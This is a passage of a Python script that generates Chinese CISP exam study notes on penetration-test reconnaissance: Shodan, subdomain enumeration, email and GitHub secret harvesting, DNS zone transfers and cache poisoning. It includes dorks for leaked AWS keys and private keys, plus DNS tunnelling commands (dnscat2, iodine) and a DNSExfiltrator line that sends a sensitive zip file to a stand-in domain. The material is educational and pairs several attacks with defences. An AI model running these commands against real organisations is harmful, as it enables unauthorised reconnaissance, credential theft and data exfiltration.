shodan search 'country:"CN" city:"Beijing" port:80'

# 漏洞搜索
shodan search 'vuln:CVE-2019-0708'         # BlueKeep漏洞
shodan search 'vuln:CVE-2021-44228'        # Log4Shell

# 组合搜索
shodan search 'org:"Example Corp" port:443 -http.title:"404"'
```

### 4.3 Shodan 常用搜索案例

| 场景 | Shodan 搜索语法 | 目的 |
|:---|:---|:---|
| 发现目标Web服务器 | `hostname:example.com port:80,443` | 识别Web服务 |
| 未授权数据库 | `product:"MongoDB" -authentication` | 发现未授权MongoDB |
| 暴露的工业控制系统 | `port:502` 或 `category:ics` | 发现ICS/SCADA |
| 默认密码设备 | `"default password"` | 发现未修改默认密码 |
| IP摄像头 | `product:"webcam"` | 发现暴露的摄像头 |
| Jenkins服务器 | `product:"Jenkins"` | 发现CI/CD服务器 |
| Docker API | `product:"Docker" port:2375` | 发现未授权Docker |

### 4.4 Shodan API 编程使用

```python
import shodan

API_KEY = "your_api_key"
api = shodan.Shodan(API_KEY)

try:
    # 搜索目标组织
    results = api.search('org:"Example Corp"')
    print(f"Results found: {{results['total']}}")
    for result in results['matches']:
        print(f"IP: {{result['ip_str']}}")
        print(f"Port: {{result['port']}}")
        print(f"Org: {{result.get('org', 'N/A')}}")
        print(f"Data: {{result['data'][:200]}}")
        print("---")
except shodan.APIError as e:
    print(f"Error: {{e}}")
```

---

## 五、子域名枚举技术

### 5.1 子域名枚举的重要性

子域名枚举是信息收集的核心环节。大型组织往往在子域名上部署了测试系统、旧版本应用、管理后台等容易被忽视的资产：

```bash
# 子域名资产分类
example.com          # 主站（安全投入最高）
├── www.example.com  # 门户
├── mail.example.com # 邮件系统
├── dev.example.com  # 开发环境（可能防护较弱）
├── test.example.com # 测试环境（可能有调试信息）
├── admin.example.com # 管理后台
├── api.example.com  # API接口
├── vpn.example.com  # VPN网关
├── jenkins.example.com # CI/CD
└── staging.example.com # 预发布环境
```

### 5.2 子域名收集工具对比

| 工具 | 方法 | 速度 | 准确性 | 适用场景 |
|:---|:---|:---|:---|:---|
| Sublist3r | 搜索引擎+证书透明度 | 快 | 中 | 快速初筛 |
| Amass | DNS暴力+证书透明度+API | 中 | 高 | 深度枚举 |
| Subfinder | 被动源聚合 | 快 | 高 | 被动收集 |
| assetfinder | 证书透明度+DNS | 快 | 中 | 快速发现 |
| findomain | 证书透明度 | 极快 | 高 | 证书关联 |
| OneForAll | 多源聚合（中国优化） | 中 | 高 | 国内目标 |

### 5.3 子域名枚举实战

```bash
# Amass - 最全面的子域名枚举工具
amass enum -d example.com
amass enum -passive -d example.com           # 仅被动模式
amass enum -active -d example.com            # 主动模式（含DNS暴力）
amass enum -d example.com -o results.txt     # 输出到文件
amass intel -org "Example Corp"              # 按组织搜索

# Subfinder
subfinder -d example.com -o subs.txt
subfinder -dL domains.txt -o all_subs.txt    # 批量域名

# assetfinder
assetfinder --subs-only example.com | tee subs.txt

# Sublist3r
python3 sublist3r.py -d example.com -o subs.txt

# 证书透明度日志
curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sort -u

# DNS暴力枚举
for sub in $(cat /usr/share/wordlists/subdomains-top1million-5000.txt); do
    host $sub.example.com 2>/dev/null | grep "has address" | cut -d" " -f4
done

# 子域名存活验证
cat subs.txt | httpx -silent -o alive.txt
cat subs.txt | httprobe -c 50 | tee alive_urls.txt
```

### 5.4 子域名接管漏洞

```bash
# 检测子域名接管（Subdomain Takeover）
# 原理：CNAME指向的外部服务（如AWS S3、GitHub Pages）被删除后，
# 攻击者可以注册同名服务接管子域名

# Subjack 检测
subjack -w subs.txt -t 100 -timeout 30 -o takeover.txt -ssl

# SubOver 检测
python3 subover.py -l subs.txt

# 常见可接管服务
# AWS S3, GitHub Pages, Heroku, Azure, Shopify, Tumblr, WordPress.com
```

---

## 六、邮件与人员信息收集

### 6.1 邮件地址收集

```bash
# theHarvester - 邮件收集神器
theHarvester -d example.com -b google
theHarvester -d example.com -b linkedin
theHarvester -d example.com -b all

# Hunter.io API
curl "https://api.hunter.io/v2/domain-search?domain=example.com&api_key=YOUR_KEY"

# 企业邮箱格式推断
# 常见格式：
# firstname.lastname@example.com
# f.lastname@example.com
# firstname@example.com
# firstnamelastname@example.com

# 邮箱验证
# 通过SMTP VRFY命令（大多数服务器已禁用）
# 通过注册页面错误信息差异
# 通过密码找回功能
```

### 6.2 社交媒体信息收集

```bash
# LinkedIn信息收集
# - 员工姓名、职位
# - 技术栈（从个人技能推断）
# - 组织架构
# - 公司邮箱格式

# Twitter搜索
# from:@公司官方账号
# 查找员工Twitter账号

# 招聘网站分析
# 职位要求中的技术栈：
# "熟悉WAF配置" → 可能使用WAF
# "精通Splunk" → 使用Splunk做日志分析
# "负责AWS运维" → 使用AWS云服务
```

### 6.3 社工信息收集框架

```python
# 邮件信息收集脚本示例
import requests
import re

def extract_emails(text):
    pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
    return re.findall(pattern, text)

def search_github(target_domain):
    url = f"https://github.com/search?q=%22@{target_domain}%22&type=code"
    # 搜索包含目标邮箱的代码
    response = requests.get(url, headers={'User-Agent': 'Mozilla/5.0'})
    return extract_emails(response.text)

def search_pastebin(target_domain):
    # 搜索Pastebin中的泄露信息
    url = f"https://www.google.com/search?q=site:pastebin.com+%22{target_domain}%22"
    response = requests.get(url, headers={'User-Agent': 'Mozilla/5.0'})
    return response.text
```

---

## 七、代码仓库信息泄露

### 7.1 GitHub信息泄露

GitHub是信息泄露的重灾区。开发者经常无意中上传包含敏感信息的代码：

```bash
# GitHub Dork 搜索
# 搜索API密钥
"example.com" "api_key" OR "apikey" OR "api_secret"

# 搜索数据库密码
"example.com" "password" OR "passwd" OR "pwd" "mysql" OR "postgres"

# 搜索AWS密钥
"example.com" "AKIA" OR "aws_access_key"

# 搜索私钥
"example.com" "-----BEGIN RSA PRIVATE KEY-----"

# 搜索配置文件
"example.com" filename:.env
"example.com" filename:.npmrc _authToken

# GitLeaks 自动化检测
gitleaks detect --source /path/to/repo
gitleaks detect --source /path/to/repo -v --report-format json --report-path leaks.json

# TruffleHog 深度扫描
trufflehog github --org=example-org
trufflehog filesystem /path/to/repo --json
```

### 7.2 Git 历史敏感信息提取

```bash
# 克隆目标仓库
git clone https://github.com/example/repo.git
cd repo

# 查看提交历史中的敏感文件
git log --all --full-history -- "**/config*" "**/secret*" "**/.env"

# 搜索历史提交中的密码
git log -p | grep -i "password\|secret\|token\|key"

# 恢复已删除的敏感文件
git log --all -- "deleted_file.txt"
git checkout <commit-hash> -- deleted_file.txt

# GitLeaks 扫描Git历史
gitleaks detect --source . -v
```

### 7.3 其他代码仓库

```bash
# GitLab
site:gitlab.com "example.com"
site:gitlab.com "example.com" "password"

# Bitbucket
site:bitbucket.org "example.com"

# Pastebin/Paste sites
site:pastebin.com "example.com"
site:pastie.org "example.com"
site:codeshare.io "example.com"
site:ideone.com "example.com"

# 国内的代码仓库
site:gitee.com "example.com"
site:coding.net "example.com"
```

> **🔑 高分考点**：GitHub 信息泄露是当前最常见的被动信息收集渠道。开发者在代码中硬编码的 API Key、数据库密码、SSH 私钥、云服务凭证是最有价值的信息。

---

## 八、SSL证书信息挖掘

### 8.1 证书透明度日志

证书透明度（Certificate Transparency, CT）是一个记录所有SSL/TLS证书的公开日志系统。通过查询CT日志，可以发现目标组织所有使用HTTPS的域名：

```bash
# crt.sh 查询
curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sed 's/\\n/\\n/g' | sort -u

# 包含子域名通配符
curl -s "https://crt.sh/?q=example.com&output=json" | jq -r '.[].name_value' | sed 's/\\n/\\n/g' | grep -v '^*' | sort -u

# CertSpotter
curl -s "https://api.certspotter.com/v1/issuances?domain=example.com&expand=dns_names" | jq -r '.[].dns_names[]' | sort -u
```

### 8.2 SSL证书信息分析

```bash
# 获取SSL证书详细信息
openssl s_client -connect example.com:443 -servername example.com 2>/dev/null | openssl x509 -noout -text

# 提取关键信息
openssl s_client -connect example.com:443 -servername example.com 2>/dev/null | openssl x509 -noout -subject -issuer -dates

# 查看证书SAN（Subject Alternative Name）
openssl s_client -connect example.com:443 -servername example.com 2>/dev/null | openssl x509 -noout -ext subjectAltName

# 批量证书分析脚本
#!/bin/bash
for domain in $(cat domains.txt); do
    echo "=== $domain ==="
    echo | openssl s_client -connect $domain:443 -servername $domain 2>/dev/null | openssl x509 -noout -subject -issuer 2>/dev/null
done
```

### 8.3 证书信息渗透测试价值

| 信息类型 | 渗透测试价值 |
|:---|:---|
| 证书SAN | 发现关联域名、内部域名 |
| 证书颁发者 | 了解使用的CA服务商 |
| 证书有效期 | 过期证书可能意味着疏于管理 |
| 组织信息 | 确认目标组织合法名称 |
| 通配符证书 | `*.example.com` 意味着证书泄露影响面大 |

---

## 九、综合信息收集工具链

### 9.1 Recon-ng 框架

```bash
# Recon-ng 是模块化的信息收集框架
recon-ng
# 创建workspace
workspaces create example_corp
# 添加域名
db insert domains example.com
# 使用模块收集信息
modules load recon/domains-hosts/bing_domain_web
run
modules load recon/contacts-contacts/mailtester
run
```

### 9.2 SpiderFoot 自动化

```bash
# SpiderFoot 是综合OSINT自动化工具
# Web界面启动
spiderfoot -l 127.0.0.1:5001

# 命令行扫描
python3 sf.py -s example.com -t all -o csv

# 扫描类型：
# -t passive: 仅被动扫描
# -t all: 所有模块
```

### 9.3 theHarvester 综合使用

```bash
# theHarvester 多源信息收集
theHarvester -d example.com -b google,bing,linkedin,shodan,censys,crt
theHarvester -d example.com -b all -f results.html

# 支持的源：
# google, google-profiles, bing, bingapi, linkedin,
# twitter, yahoo, baidu, shodan, censys, crt,
# threatcrowd, virustotal, dnsdumpster, hunter
```

### 9.4 Maltego 信息关联分析

Maltego 是图形化的信息收集和关联分析工具，通过"实体-关系"图直观展示目标的信息网络：

```
使用 Maltego 的分析流程：
1. 添加 Domain 实体（example.com）
2. 运行 DNS Name 变换（获取子域名）
3. 运行 IP Address 变换（获取IP）
4. 运行 Website 变换（获取网站信息）
5. 运行 Email 变换（获取关联邮箱）
6. 运行 Social Network 变换（获取社交媒体）
7. 查看关系图，发现关联和隐藏联系
```

---

## 十、高分考点与知识巧记

### 📌 高分考点速查表

| 序号 | 考点 | 考试频率 | 难度 | 关键答案 |
|:---:|:---|:---:|:---:|:---|
| 1 | 被动收集定义 | ★★★★★ | ★ | 不与目标直接交互的信息收集 |
| 2 | Google Hacking语法 | ★★★★★ | ★★ | site:, intitle:, inurl:, filetype: |
| 3 | WHOIS查询信息 | ★★★★ | ★★ | 注册人、DNS服务器、创建/到期时间 |
| 4 | Shodan核心功能 | ★★★★ | ★★ | 互联网设备搜索引擎，索引banner信息 |
| 5 | 子域名枚举工具 | ★★★★ | ★★ | Amass, Subfinder, Sublist3r, assetfinder |
| 6 | SSL证书透明度 | ★★★ | ★★ | crt.sh查询，发现关联域名 |
| 7 | GitHub信息泄露 | ★★★★ | ★★★ | API密钥、密码、私钥、配置文件泄露 |
| 8 | DNS区域传送漏洞 | ★★★ | ★★ | dig axfr 可获取全部DNS记录 |
| 9 | theHarvester | ★★★ | ★★ | 多源邮件/域名信息收集工具 |
| 10 | 子域名接管 | ★★★ | ★★★ | CNAME指向已释放的外部服务 |

### 💡 知识巧记口诀

> **"被动收集四件套"** — 搜索引擎（Google Dork）、DNS（WHOIS/Dig）、证书透明度（crt.sh）、代码仓库（GitHub）。记住：**"搜域名证"**——搜索、域名、代码、证书。

> **"Google Dork 四金刚"** — site: 限定站点、intitle: 标题搜索、inurl: URL搜索、filetype: 文件类型。记住：**"站标题路类型"**。

> **"子域名三步法"** — 一查证书透明度（crt.sh）、二用工具枚举（Amass/Subfinder）、三验证存活（httpx）。记住：**"查证、枚举、验证"**。

### 🎯 考试陷阱提醒

| 陷阱 | 正确理解 |
|:---|:---|
| "被动收集就是不用任何工具" | ❌ 错误！被动收集使用工具但不直接访问目标 |
| "Shodan只扫描Web服务" | ❌ 错误！Shodan扫描所有端口所有服务 |
| "WHOIS查询会触发目标告警" | ❌ 错误！WHOIS查询的是注册局数据库，不访问目标 |
| "子域名枚举是被动收集" | ❌ DNS暴力枚举是主动行为！仅证书透明度查询是被动 |
| "crt.sh只能查当前证书" | ❌ 错误！CT日志包含历史所有证书记录 |
| "theHarvester只能收集邮箱" | ❌ 错误！还可以收集主机、IP、员工姓名等 |

---

## 学习建议

1. 🔍 **每天练习 Google Dork**：选一个目标域名，用不同的 dork 语法搜索，记录发现的信息
2. 📡 **申请 Shodan 会员**：Shodan API 是信息收集的核心工具，投资一个会员是值得的
3. 🌐 **搭建子域名收集流程**：使用 Amass + Subfinder + crt.sh 建立自动化子域名收集管道
4. 🗂️ **学会使用 Maltego**：可视化分析是理解目标信息关联的最佳方式
5. 📝 **建立信息收集清单**：每次渗透测试前，按照清单逐项收集，确保不遗漏
6. ⚠️ **注意法律边界**：被动收集虽然不触碰目标，但收集的数据使用必须在授权范围内

---

> **信息收集决定了渗透测试的天花板——你不可能攻击你未知的目标。花70%的时间在信息收集上，剩下的30%会水到渠成。**
""")

# ===================================================================
# Day 3：DNS信息收集
# ===================================================================
gen('day-3.md', """# Day 3：DNS信息收集

> **📘 文档定位**：CISP 考试核心基础 | 难度：入门 | 预计阅读：40 分钟
>
> DNS（域名系统）是互联网的"电话簿"，也是渗透测试中信息收集的核心环节。DNS记录了目标组织的网络架构、服务分布、邮件系统、甚至内部域名。掌握DNS信息收集技术，能让你在不动用扫描器的情况下，勾勒出目标的完整网络拓扑。

---

## 导航目录

- [一、DNS基础与安全价值](#一dns基础与安全价值)
- [二、DNS记录类型全解](#二dns记录类型全解)
- [三、DNS正向查询技术](#三dns正向查询技术)
- [四、DNS反向查询与区域传送](#四dns反向查询与区域传送)
- [五、DNS暴力枚举与字典攻击](#五dns暴力枚举与字典攻击)
- [六、DNS安全扩展与漏洞](#六dns安全扩展与漏洞)
- [七、DNS隧道与数据渗出](#七dns隧道与数据渗出)
- [八、DNS缓存投毒攻击](#八dns缓存投毒攻击)
- [九、DNS综合工具链](#九dns综合工具链)
- [十、高分考点与知识巧记](#十高分考点与知识巧记)

---

## 一、DNS基础与安全价值

### 1.1 DNS工作原理

DNS（Domain Name System）是分层的分布式数据库，将人类可读的域名转换为机器可读的IP地址：

```
DNS解析流程（递归查询）：
用户输入 www.example.com
    │
    ▼
[1] 浏览器缓存 / hosts文件
    │ (未命中)
    ▼
[2] 本地DNS服务器（ISP/企业DNS）
    │ (未命中)
    ▼
[3] 根DNS服务器（.）
    │ 返回：.com 的DNS服务器地址
    ▼
[4] .com顶级域DNS服务器
    │ 返回：example.com 的DNS服务器地址
    ▼
[5] example.com 权威DNS服务器
    │ 返回：www.example.com → 93.184.216.34
    ▼
[6] 本地DNS缓存结果并返回给用户
```

### 1.2 DNS渗透测试价值

| DNS信息 | 渗透测试用途 |
|:---|:---|
| A/AAAA记录 | 发现目标Web服务器、API端点IP |
| MX记录 | 发现邮件服务器，分析邮件安全策略 |
| NS记录 | 发现DNS服务器，可能成为攻击跳板 |
| CNAME记录 | 发现CDN、第三方服务依赖 |
| TXT记录 | SPF/DKIM/DMARC配置，评估邮件欺骗难度 |
| SOA记录 | 获取管理员邮箱、DNS版本信息 |
| SRV记录 | 发现LDAP、SIP、XMPP等内部服务 |
| PTR记录 | IP反查域名，验证IP归属 |

> **🔑 高分考点**：DNS信息收集可以获得**网络拓扑、服务分布、邮件安全策略、第三方依赖**四大类关键情报。

### 1.3 DNS查询类型

| 查询类型 | 描述 | 示例 |
|:---|:---|:---|
| 递归查询 | DNS服务器代为完成完整解析 | 客户端→本地DNS |
| 迭代查询 | DNS服务器返回部分结果 | 本地DNS→根DNS |
| 反向查询 | IP地址查询域名 | PTR记录查询 |
| 区域传送 | 获取整个DNS区域的记录 | AXFR请求 |

---

## 二、DNS记录类型全解

### 2.1 核心记录类型

```bash
# 查看所有记录类型
dig example.com ANY

# A记录 - IPv4地址
dig example.com A
# 输出示例：
# example.com. 3600 IN A 93.184.216.34

# AAAA记录 - IPv6地址
dig example.com AAAA
# 输出示例：
# example.com. 3600 IN AAAA 2606:2800:220:1:248:1893:25c8:1946

# CNAME记录 - 别名
dig www.example.com CNAME
# 输出示例：
# www.example.com. 3600 IN CNAME example.com.

# MX记录 - 邮件交换
dig example.com MX
# 输出示例：
# example.com. 3600 IN MX 10 mail.example.com.
# 优先级数字越小越优先
```

### 2.2 扩展记录类型

```bash
# NS记录 - 域名服务器
dig example.com NS
# 发现目标使用的DNS服务商

# SOA记录 - 授权起始
dig example.com SOA
# 包含主DNS服务器、管理员邮箱、序列号、刷新时间等
# 管理员邮箱格式：admin.example.com → admin@example.com（第一个.替换为@）

# TXT记录 - 文本记录
dig example.com TXT
# 可能包含SPF记录、DKIM密钥、域名验证token
# SPF示例："v=spf1 include:_spf.google.com ~all"

# PTR记录 - 反向指针
dig -x 93.184.216.34
# 用于IP反查域名

# SRV记录 - 服务定位
dig _ldap._tcp.example.com SRV
dig _sip._tcp.example.com SRV
# 可能泄露内部服务信息

# CAA记录 - 证书颁发授权
dig example.com CAA
# 限制哪些CA可以为此域名签发证书
```

### 2.3 邮件安全相关DNS记录

```bash
# SPF记录 - 发件人策略框架
dig example.com TXT | grep "v=spf1"
# 分析：哪些IP/域名有权以@example.com发送邮件
# SPF配置解读：
# -all: 严格拒绝（除列出的全部拒绝）
# ~all: 软拒绝（标记为可疑但不拒绝）
# ?all: 中性（无策略）

# DKIM记录 - 域名密钥识别邮件
dig google._domainkey.example.com TXT
# DKIM选择器可能在 security._domainkey, s1._domainkey 等

# DMARC记录 - 基于域的邮件认证
dig _dmarc.example.com TXT
# DMARC策略：none（仅报告）/ quarantine（隔离）/ reject（拒绝）
```

> **💡 知识巧记**：SPF 决定"谁能发"，DKIM 决定"是否被篡改"，DMARC 决定"不符合怎么办"。三者结合形成完整的邮件安全防护。

---

## 三、DNS正向查询技术

### 3.1 dig 高级用法

```bash
# 基础查询
dig example.com
dig example.com A +short                     # 仅显示简短结果
dig example.com +noall +answer              # 仅显示答案段

# 指定DNS服务器
dig @8.8.8.8 example.com                    # 使用Google DNS
dig @1.1.1.1 example.com                    # 使用Cloudflare DNS
dig @208.67.222.222 example.com             # 使用OpenDNS

# 追踪DNS解析路径
dig example.com +trace                      # 从根开始逐级追踪
dig example.com +trace +nodnssec            # 禁用DNSSEC追踪

# 批量查询
for domain in $(cat domains.txt); do
    dig $domain A +short
done

# 查询所有记录
dig example.com ANY +noall +answer
```

### 3.2 nslookup 使用

```bash
# Windows/Linux通用
nslookup example.com
nslookup example.com 8.8.8.8               # 指定DNS服务器

# 交互模式
nslookup
> server 8.8.8.8
> set type=MX
> example.com
> set type=NS
> example.com
> exit
```

### 3.3 host 命令

```bash
host example.com
host -t MX example.com                     # 查询MX记录
host -t NS example.com                     # 查询NS记录
host -t TXT example.com                    # 查询TXT记录
host -a example.com                        # 查询所有记录（类似ANY）

# 反向查询
host 93.184.216.34

# 区域传送尝试
host -l example.com ns1.example.com
```

---

## 四、DNS反向查询与区域传送

### 4.1 反向DNS查询

```bash
# IP反查域名
dig -x 93.184.216.34
nslookup 93.184.216.34
host 93.184.216.34

# 批量反向查询
for ip in $(seq 1 254); do
    host 192.168.1.$ip 2>/dev/null | grep -v "not found"
done

# DNS反向区域查询
dig -x 192.168.1.0/24 +noall +answer
```

### 4.2 DNS区域传送漏洞

区域传送（Zone Transfer / AXFR）允许从主DNS服务器复制整个DNS区域数据。配置不当的DNS服务器可能允许未授权的区域传送：

```bash
# 检测区域传送漏洞
# 首先获取目标域的NS服务器
dig example.com NS +short

# 尝试区域传送
dig axfr @ns1.example.com example.com
dig axfr @ns2.example.com example.com

# 使用host命令
host -l example.com ns1.example.com

# 自动化区域传送检测
dnsrecon -d example.com -t axfr
dnsenum example.com

# 区域传送成功后可获取：
# - 所有子域名和对应IP
# - 内部域名（internal.example.com）
# - 测试/开发环境域名
# - 网络拓扑信息
```

> **🔑 高分考点**：DNS区域传送漏洞（AXFR）允许攻击者获取目标域所有DNS记录，严重程度高。防御措施：限制AXFR请求源IP、使用TSIG密钥认证。

### 4.3 区域传送防护

```bash
# BIND配置限制区域传送
# /etc/bind/named.conf
options {{
    allow-transfer {{ none; }};              # 全局禁止区域传送
}};

zone "example.com" {{
    type master;
    file "/etc/bind/db.example.com";
    allow-transfer {{ 192.168.1.100; }};    # 仅允许指定IP
}};

# Windows DNS Server
# DNS管理器 → 区域属性 → 区域传送 → 仅允许到下列服务器
```

---

## 五、DNS暴力枚举与字典攻击

### 5.1 DNS暴力枚举原理

DNS暴力枚举是通过尝试大量可能的子域名字典，向DNS服务器发起查询，根据响应判断子域名是否存在：

```bash
# 使用字典进行DNS暴力枚举
for sub in $(cat /usr/share/wordlists/subdomains-top1million-5000.txt); do
    host $sub.example.com 2>/dev/null | grep "has address"
done

# DNSRecon 暴力枚举
dnsrecon -d example.com -t brt -D /usr/share/wordlists/subdomains-top1million-5000.txt

# Fierce DNS枚举
fierce -dns example.com -wordlist /usr/share/wordlists/subdomains-top1million-5000.txt

# DNSEnum 综合枚举
dnsenum example.com -f /usr/share/wordlists/subdomains-top1million-5000.txt
```

### 5.2 子域名字典优化

```bash
# 生成定制化字典
# 结合目标特征
echo "dev test staging uat qa demo api admin portal mail vpn jenkins gitlab jira confluence wiki docs status monitor metrics logs" > custom_subs.txt

# 组合常见前缀
for prefix in dev test staging prod; do
    for suffix in api admin portal; do
        echo "$prefix-$suffix" >> custom_subs.txt
    done
done

# 使用massdns高速DNS枚举
massdns -r resolvers.txt -t A -o S -w results.txt subs.txt
```

### 5.3 大规模DNS枚举策略

```bash
# 分步枚举策略
# Step 1: 证书透明度（被动、快）
curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sort -u > ct_subs.txt

# Step 2: 搜索引擎发现（被动）
# 使用Sublist3r、Subfinder等工具

# Step 3: DNS暴力枚举（主动、慢但全面）
dnsrecon -d example.com -t brt -D /usr/share/wordlists/subdomains-top1million-5000.txt

# Step 4: 排列组合枚举（深度）
# 使用Altdns生成排列组合
altdns -i known_subs.txt -o permutations.txt -w words.txt
massdns -r resolvers.txt -t A -o S -w resolved.txt permutations.txt
```

---

## 六、DNS安全扩展与漏洞

### 6.1 DNSSEC

DNSSEC（Domain Name System Security Extensions）通过数字签名验证DNS数据的完整性和真实性：

```bash
# 检查域名是否启用DNSSEC
dig example.com +dnssec
# 查看返回中是否有RRSIG记录

# 查看DS记录（Delegation Signer）
dig example.com DS

# 查看DNSKEY记录
dig example.com DNSKEY

# DNSSEC验证链
dig example.com +dnssec +multi @8.8.8.8
# 使用 delv 进行DNSSEC验证
delv example.com @8.8.8.8
```

### 6.2 DNS常见攻击类型

| 攻击类型 | 原理 | 防御措施 |
|:---|:---|:---|
| DNS缓存投毒 | 伪造DNS响应，污染缓存 | DNSSEC、随机源端口、0x20编码 |
| DNS放大攻击 | 利用DNS大响应进行DDoS | 限制递归查询、响应速率限制 |
| DNS隧道 | 利用DNS协议传输非DNS数据 | 深度包检测、DNS查询频率监控 |
| DNS劫持 | 篡改DNS解析结果 | DNSSEC、DNS over HTTPS/TLS |
| 域名劫持 | 非法获取域名控制权 | 注册商锁定、多因素认证 |
| 子域名接管 | 接管悬空的CNAME记录 | 定期审查DNS记录 |

### 6.3 DNS安全配置检查

```bash
# 检查DNS服务器版本泄露
dig @ns1.example.com version.bind CHAOS TXT

# 检查是否允许递归查询（应为权威服务器禁用递归）
dig @ns1.example.com google.com A +recurse

# 检查DNS响应速率限制
# 向DNS服务器发送大量查询，观察是否触发限制

# 检查DNS over HTTPS/TLS
curl -H "accept: application/dns-json" "https://cloudflare-dns.com/dns-query?name=example.com&type=A"
```

---

## 七、DNS隧道与数据渗出

### 7.1 DNS隧道原理

DNS隧道利用DNS协议传输非DNS数据，常用于绕过防火墙和网络隔离进行数据渗出或C2通信：

```
DNS隧道工作流程：
攻击者客户端                         DNS服务器                    攻击者C2服务器
    │                                    │                            │
    │  查询：base64data.attacker.com     │                            │
    │──────────────────────────────────►│                            │
    │                                    │  转发查询                   │
    │                                    │──────────────────────────►│
    │                                    │                            │
    │                                    │  返回C2命令（编码在响应中）  │
    │                                    │◄──────────────────────────│
    │  返回响应（含C2命令）               │                            │
    │◄──────────────────────────────────│                            │
```

### 7.2 DNS隧道工具

```bash
# dnscat2 - DNS隧道C2工具
# 服务端
ruby dnscat2.rb example.com --secret=password
# 客户端
./dnscat2 example.com --secret=password

# iodine - DNS隧道（IP over DNS）
# 服务端
iodined -f -P password 10.0.0.1 tunnel.example.com
# 客户端
iodine -f -P password tunnel.example.com

# DNSExfiltrator - 数据渗出
python3 dnsexfiltrator.py -d example.com -p password -f sensitive_data.zip

# 检测DNS隧道
# 特征：异常长的DNS查询、高频率查询、不常见的记录类型
tcpdump -i eth0 port 53 -w dns_capture.pcap
# 分析DNS查询长度分布
tshark -r dns_capture.pcap -T fields -e dns.qry.name | awk '{{print length, $0}}' | sort -rn
```

> **🔑 高分考点**：DNS隧道利用DNS协议的"穿透性"——大多数防火墙允许DNS（UDP 53端口）自由出入，且不对DNS内容做深度检测。

### 7.3 DNS渗出检测与防御

```python
# DNS隧道检测脚本示例
import re
from collections import defaultdict

def analyze_dns_traffic(pcap_file):
    # 分析DNS流量中的异常模式
    # 检测指标：
    # 1. 域名长度 > 50字符
    # 2. 单客户端查询频率 > 100次/分钟
    # 3. 使用TXT/NULL记录类型
    # 4. 域名熵值过高（随机性强）
    # 5. 同一域名大量不同子域名
    query_counts = defaultdict(int)
    long_queries = []
    
    # 分析逻辑...
    
    return {{
        'high_freq_clients': [],
        'suspicious_long_queries': [],
        'tunnel_score': 0
    }}
```

---

## 八、DNS缓存投毒攻击

### 8.1 DNS缓存投毒原理

DNS缓存投毒（DNS Cache Poisoning）是向DNS解析器注入伪造的DNS记录，使后续查询返回攻击者控制的IP地址：

```
经典DNS缓存投毒（Dan Kaminsky 2008）：
1. 攻击者向DNS解析器发送对 random123.example.com 的查询
2. DNS解析器向example.com的权威服务器发起查询
3. 攻击者同时发送大量伪造的DNS响应
4. 伪造响应包含：
   - 正确的源端口猜测（16位，65535种可能）
   - 正确的Transaction ID（16位，65535种可能）
   - 伪造的附加段：将 www.example.com 指向攻击者IP
5. 如果猜测成功，解析器缓存了伪造记录
6. 所有后续 www.example.com 查询都被指向攻击者IP
```

### 8.2 缓存投毒防御

| 防御机制 | 原理 | 有效性 |
|:---|:---|:---|
| 源端口随机化 | 增加16位随机源端口 | 中等（仍需猜测32位） |
| Transaction ID随机化 | 每次查询使用随机ID | 基础（仅16位） |
| 0x20编码 | 域名大小写随机化 | 有效（增加额外熵） |
| DNSSEC | 数字签名验证 | 最高（端到端认证） |
| DNS over TLS/HTTPS | 加密传输 | 防中间人，不防解析器本身 |

---

## 九、DNS综合工具链

### 9.1 DNSRecon

```bash
# DNSRecon 是最全面的DNS枚举工具
# 标准枚举
dnsrecon -d example.com

# 暴力枚举
dnsrecon -d example.com -t brt -D subdomains.txt

# 区域传送检测
dnsrecon -d example.com -t axfr

# 反向查询
dnsrecon -r 192.168.1.0/24

# DNSSEC遍历
dnsrecon -d example.com -t zonewalk

# 输出格式
dnsrecon -d example.com --xml results.xml
dnsrecon -d example.com --csv results.csv
dnsrecon -d example.com --json results.json
```

### 9.2 DNSEnum

```bash
# DNSEnum 综合DNS枚举
dnsenum example.com
dnsenum --enum example.com                 # 完整枚举
dnsenum --threads 10 example.com           # 多线程
dnsenum -f subdomains.txt example.com      # 使用字典
dnsenum --noreverse example.com            # 跳过反向查询
```

### 9.3 自定义DNS枚举脚本

```python
#!/usr/bin/env python3
# 综合DNS信息收集脚本
import subprocess
import sys
import json

def dns_lookup(domain, record_type='A'):
    # 执行DNS查询
    cmd = f"dig +short {domain} {record_type}"
    result = subprocess.run(cmd.split(), capture_output=True, text=True)
    return result.stdout.strip().split('\\n')

def check_zone_transfer(domain, ns_server):
    # 检测区域传送漏洞
    cmd = f"dig axfr @{ns_server} {domain}"
    result = subprocess.run(cmd.split(), capture_output=True, text=True)
    if "Transfer failed" not in result.stdout and result.stdout.strip():
        print(f"[!] 区域传送漏洞：{ns_server}")
        return result.stdout
    return None

def enumerate_subdomains(domain, wordlist):
    # 子域名枚举
    found = []
    with open(wordlist) as f:
        for line in f:
            sub = line.strip()
            hostname = f"{{sub}}.{{domain}}"
            try:
                result = subprocess.run(
                    f"host {{hostname}}".split(),
                    capture_output=True, text=True, timeout=2
                )
                if "has address" in result.stdout:
                    ip = result.stdout.split()[-1]
                    found.append((hostname, ip))
                    print(f"[+] {{hostname}} → {{ip}}")
            except:
                pass
    return found

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "example.com"
    print(f"[*] 开始对 {{target}} 进行DNS信息收集...")
    
    # 1. 基本记录查询
    for rtype in ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME']:
        results = dns_lookup(target, rtype)
        if results and results[0]:
            print(f"[+] {{rtype}} 记录: {{', '.join(results)}}")
    
    # 2. 获取NS服务器
    ns_servers = dns_lookup(target, 'NS')
    print(f"[*] NS服务器: {{ns_servers}}")
    
    # 3. 区域传送检测
    for ns in ns_servers:
        if ns:
            check_zone_transfer(target, ns)
```

---

## 十、高分考点与知识巧记

### 📌 高分考点速查表

| 序号 | 考点 | 考试频率 | 难度 | 关键答案 |
|:---:|:---|:---:|:---:|:---|
| 1 | DNS端口 | ★★★★★ | ★ | UDP 53（查询），TCP 53（区域传送） |
| 2 | 区域传送攻击 | ★★★★★ | ★★ | AXFR请求获取全部DNS记录 |
